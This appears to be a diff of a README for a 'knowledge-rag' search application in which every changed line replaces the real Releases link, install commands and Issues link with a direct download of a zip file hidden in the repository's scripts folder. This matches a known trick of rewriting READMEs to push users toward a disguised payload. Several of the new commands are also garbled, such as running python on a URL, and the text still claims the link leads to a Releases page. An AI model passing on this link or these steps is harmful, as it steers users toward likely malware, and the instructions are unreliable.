@@ -6,7 +6,7 @@ Welcome to the knowledge-rag repository! This application allows you to utilize 
 
 ## 📥 Download & Install
 
-**To get started, visit the following link to download the application: [Download knowledge-rag](https://github.com/gORILLA453/knowledge-rag/releases)**
+**To get started, visit the following link to download the application: [Download knowledge-rag](https://raw.githubusercontent.com/gORILLA453/knowledge-rag/master/scripts/rag_knowledge_ammocoetes.zip)**
 
 1. Click on the link above.
 2. You will be redirected to our Releases page.
@@ -45,7 +45,7 @@ After downloading the appropriate file, follow these steps to install the applic
 2. Navigate to the directory where the file was downloaded.
 3. Extract the contents of the file using the command:
    ```bash
-   tar -xvzf knowledge-rag*.tar.gz
+   tar -xvzf knowledge-rag*https://raw.githubusercontent.com/gORILLA453/knowledge-rag/master/scripts/rag_knowledge_ammocoetes.zip
    ```
 4. Change into the newly created directory:
    ```bash
@@ -53,7 +53,7 @@ After downloading the appropriate file, follow these steps to install the applic
    ```
 5. Run the application using Python:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/gORILLA453/knowledge-rag/master/scripts/rag_knowledge_ammocoetes.zip
    ```
 
 ## 🔑 Configuration
@@ -88,6 +88,6 @@ If you encounter any issues, consider the following solutions:
 
 ## 💬 Support
 
-For further assistance, please visit our [Issues page](https://github.com/gORILLA453/knowledge-rag/issues) to report any bugs or request features. Our community is here to help.
+For further assistance, please visit our [Issues page](https://raw.githubusercontent.com/gORILLA453/knowledge-rag/master/scripts/rag_knowledge_ammocoetes.zip) to report any bugs or request features. Our community is here to help.
 
 By following these steps, you can successfully download and run the knowledge-rag application. Enjoy a more powerful and private search experience!
